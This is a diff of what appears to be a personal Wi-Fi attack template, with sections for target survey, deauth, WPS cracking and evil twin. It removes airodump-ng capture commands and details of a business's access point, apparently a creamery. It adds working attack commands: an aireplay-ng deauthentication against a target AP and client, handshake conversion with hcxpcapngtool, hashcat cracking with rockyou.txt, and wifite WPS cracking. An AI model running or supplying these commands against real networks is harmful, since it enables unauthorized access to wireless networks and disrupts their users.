@@ -1,9 +1,3 @@
-collection
-sudo airodump-ng -w /home/a28/collections/wifi --uptime --manufacturer --wps --gpsd wlan1
-sudo airodump-ng -w /home/a28/collections/wifi -c 3 --uptime --manufacturer --wps --bssid 14:EB:B6:13:8E:0D --gpsd wlan1
-sudo airodump-ng -w /home/a28/collections/wifi -c 1 --uptime --manufacturer --wps --bssid 48:22:54:D5:ED:4E  --gpsd wlan1
-
-
 #Target Templates
 #Situation:
 Colstone creamery access point 
@@ -15,10 +9,10 @@ Wi-Fi Survey
 Jan 15 2024, 13:41
 
 #SSID(human network name)##############
-TP-Link_EBB2
+
 
 #BSSID(Make address)##############
-5C:A6:E6:F3:EB:B2
+
 
 #CHANNEL##############
 
@@ -27,15 +21,20 @@ TP-Link_EBB2
 
 
 #ENCRYPTION##############
-WPA2 WPA2-PSK AES-CCM
+
 
 #ASSOCIATED CLIENTS##############
 
 
 #DEAUTH##############
+sudo aireplay-ng -0 1 -a <TARGET AP> -c <TGT CLIENT> wlx00c0cab46234 
+hcxpcapngtool -o dict.hash.22000 Lab1.handshake # this will generate a hash of the file
+hashcat -a 0 -m 22000 dict.hash.22000 rockyou.txt
 --
 
-#PIXIE##############
+#PIXIE/REAVER/WPS CRACK##############
+sudo wifite --wps-only 
+
 ---
 
 #EVIL TWIN##############
